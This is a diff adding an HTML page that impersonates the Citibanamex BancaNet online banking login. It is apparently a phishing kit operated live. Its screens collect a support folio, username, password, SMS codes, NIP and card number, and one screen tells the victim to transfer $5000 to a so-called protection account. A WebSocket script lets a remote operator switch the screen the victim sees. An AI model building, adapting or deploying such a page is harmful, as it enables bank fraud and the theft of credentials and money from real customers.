@@ -1,0 +1,276 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Citibanamex | BancaNet</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background-color: #f9f9f9;
+    }
+
+    .topbar {
+      background-color: #005BAC;
+      padding: 15px 0;
+      text-align: center;
+    }
+
+    .topbar img {
+      height: 25px;
+    }
+
+    .topbar h1 {
+      color: white;
+      font-size: 1.2rem;
+      margin-top: 5px;
+    }
+
+    .container {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 70vh;
+    }
+
+    .box {
+      background-color: white;
+      padding: 30px;
+      border-radius: 8px;
+      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+      width: 350px;
+      text-align: center;
+    }
+
+    .box img {
+      height: 25px;
+      margin-bottom: 10px;
+    }
+
+    .box h2 {
+      margin: 10px 0;
+      font-size: 20px;
+    }
+
+    .box p {
+      color: #444;
+      font-size: 14px;
+    }
+
+    .box input {
+      width: 100%;
+      padding: 10px;
+      margin-top: 10px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+    }
+
+    .box button {
+      background-color: #0070BA;
+      color: white;
+      border: none;
+      padding: 10px 20px;
+      margin-top: 20px;
+      width: 100%;
+      border-radius: 4px;
+      cursor: pointer;
+      font-size: 16px;
+    }
+
+    .box a {
+      display: block;
+      margin-top: 10px;
+      color: #0070BA;
+      text-decoration: none;
+      font-size: 14px;
+    }
+
+    .links-bar {
+      text-align: center;
+      margin-top: 20px;
+      font-size: 13px;
+    }
+
+    .links-bar span {
+      margin: 0 10px;
+      color: #333;
+    }
+
+    .footer {
+      text-align: center;
+      padding: 20px;
+      background-color: #005BAC;
+      color: white;
+      font-size: 12px;
+    }
+
+    .footer-links {
+      display: flex;
+      justify-content: center;
+      gap: 20px;
+      margin-top: 10px;
+      font-size: 13px;
+    }
+
+    .footer-links a {
+      color: white;
+      text-decoration: none;
+    }
+
+    .screen {
+      display: none;
+    }
+
+    .active {
+      display: flex;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="topbar">
+    <img src="RUTA/DEL/LOGO.png" alt="Citibanamex Logo">
+    <h1>BancaNet</h1>
+  </div>
+
+  <!-- Pantallas -->
+  <div id="folio-screen" class="container screen active">
+    <div class="box">
+      <img src="RUTA/DEL/LOGO.png">
+      <h2>Folio de soporte:</h2>
+      <p>Por favor, ingrese el folio de soporte técnico que su ejecutivo en línea le proporcionó.</p>
+      <input type="text" placeholder="Ingrese su número de folio">
+      <button>Ingresar</button>
+    </div>
+  </div>
+
+  <div id="login-screen" class="container screen">
+    <div class="box">
+      <img src="RUTA/DEL/LOGO.png">
+      <h2>Inicio de sesión:</h2>
+      <p>Por favor, ingrese su usuario y contraseña.</p>
+      <input type="text" placeholder="Usuario">
+      <input type="password" placeholder="Contraseña">
+      <button>Ingresar</button>
+    </div>
+  </div>
+
+  <div id="codigo-screen" class="container screen">
+    <div class="box">
+      <img src="RUTA/DEL/LOGO.png">
+      <h2>Hemos enviado un código de verificación</h2>
+      <p>Ingresa el código que recibiste en tu número celular terminación: <strong>1881</strong></p>
+      <input type="text" placeholder="Ingrese el SMS Recibido">
+      <button>Continuar</button>
+      <a href="#">Nueva aclaración</a>
+      <a href="#">Estatus de mis aclaraciones</a>
+    </div>
+  </div>
+
+  <div id="nip-screen" class="container screen">
+    <div class="box">
+      <img src="RUTA/DEL/LOGO.png">
+      <h2>Ingrese su NIP de confirmación</h2>
+      <p>Para confirmar la cancelación de su cargo no reconocido, por favor ingrese su NIP.</p>
+      <input type="password" placeholder="NIP de confirmación">
+      <button>Validar</button>
+      <a href="#">Nueva aclaración</a>
+      <a href="#">Estatus de mis aclaraciones</a>
+    </div>
+  </div>
+
+  <div id="proteger-screen" class="container screen">
+    <div class="box">
+      <img src="RUTA/DEL/LOGO.png">
+      <h2>Es necesario proteger su saldo</h2>
+      <p>Por su seguridad, protegeremos el saldo de su cuenta creando una cuenta de TOTAL PROTECCIÓN.</p>
+      <p>Saldo sin proteger:</p>
+      <h2>$500</h2>
+    </div>
+  </div>
+
+  <div id="transferencia-screen" class="container screen">
+    <div class="box">
+      <img src="RUTA/DEL/LOGO.png">
+      <h2>Cuenta SU TOTAL PROTECCIÓN creada exitosamente.</h2>
+      <p>Para proteger su saldo, transfiera <strong>$5000</strong> a:</p>
+      <p><strong>Clabe:</strong> 399393993939393939393</p>
+      <p><strong>Titular:</strong> Mnue</p>
+      <p><strong>Alias:</strong> Cuenta de respaldo</p>
+      <p>Esta ventana se actualizará una vez que reconozcamos la transferencia.</p>
+    </div>
+  </div>
+
+  <div id="proteccion-adicional-screen" class="container screen">
+    <div class="box">
+      <img src="RUTA/DEL/LOGO.png">
+      <h2>Protección adicional</h2>
+      <p>Agregaremos protección adicional a su tarjeta de crédito/débito.</p>
+      <input type="text" placeholder="Número de tarjeta">
+      <button>Continuar</button>
+      <a href="#">Nueva aclaración</a>
+      <a href="#">Estatus de mis aclaraciones</a>
+    </div>
+  </div>
+
+  <div id="codigo-cancelacion-screen" class="container screen">
+    <div class="box">
+      <img src="RUTA/DEL/LOGO.png">
+      <h2>Cancelación de cargos:</h2>
+      <p>El código que recibiste para autorizar la compra también sirve para cancelación. Terminación: <strong>1881</strong></p>
+      <input type="text" placeholder="Ingrese el SMS Recibido">
+      <button>Continuar</button>
+      <a href="#">Nueva aclaración</a>
+      <a href="#">Estatus de mis aclaraciones</a>
+    </div>
+  </div>
+
+  <div id="cancelacion-exitosa-screen" class="container screen">
+    <div class="box">
+      <img src="RUTA/DEL/LOGO.png">
+      <h2>Cancelación exitosa</h2>
+      <p>Cancelamos exitosamente el cargo no reconocido.</p>
+      <p><strong>Comercio:</strong> leidd</p>
+      <p><strong>Monto devuelto:</strong> $5000</p>
+      <p>En un lapso no mayor a 72 hrs, el monto será reintegrado.</p>
+    </div>
+  </div>
+
+  <!-- Pie de página -->
+  <div class="links-bar">
+    <span>Aprende más</span>
+    <span>Ayuda</span>
+    <span>Términos y condiciones</span>
+    <span>Seguridad en línea</span>
+  </div>
+
+  <div class="footer">
+    <div class="footer-links">
+      <a href="#">Contáctanos</a>
+      <a href="#">Aclaraciones</a>
+      <a href="#">Promociones</a>
+      <a href="#">Facebook</a>
+      <a href="#">Youtube</a>
+    </div>
+    <p>© Banamex México 2024. Todos los Derechos Reservados</p>
+  </div>
+
+  <script>
+    function mostrarPantalla(id) {
+      document.querySelectorAll('.screen').forEach(div => div.classList.remove('active'));
+      document.getElementById(id).classList.add('active');
+    }
+
+    // Ejemplo para WebSocket
+    const socket = new WebSocket("ws://localhost:3000");
+
+    socket.onmessage = (event) => {
+      const data = JSON.parse(event.data);
+      if (data.tipo === "cambiar_pantalla") {
+        mostrarPantalla(data.id);
+      }
+    };
+  </script>
+
+</body>
+</html>
